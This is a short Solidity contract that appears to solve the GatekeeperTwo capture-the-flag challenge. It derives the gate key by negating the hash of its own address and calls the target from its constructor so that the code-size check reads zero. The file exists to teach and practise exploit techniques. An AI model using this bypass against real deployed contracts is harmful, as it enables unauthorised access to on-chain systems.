// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IGateKeeperTwo {

  function enter(bytes8 _gateKey) external returns (bool);
}


contract AttackerGatekeeperTwo{

    IGateKeeperTwo victim;
    // gateKey determined with analysis of the gate3
    bytes8 gateKey;

    constructor(address _victim) {
        victim = IGateKeeperTwo(_victim);
        gateKey = ~ bytes8(keccak256(abi.encodePacked(address(this))));
        require(victim.enter(gateKey),"Didn't work"); // for extcallsize = 0
    }
}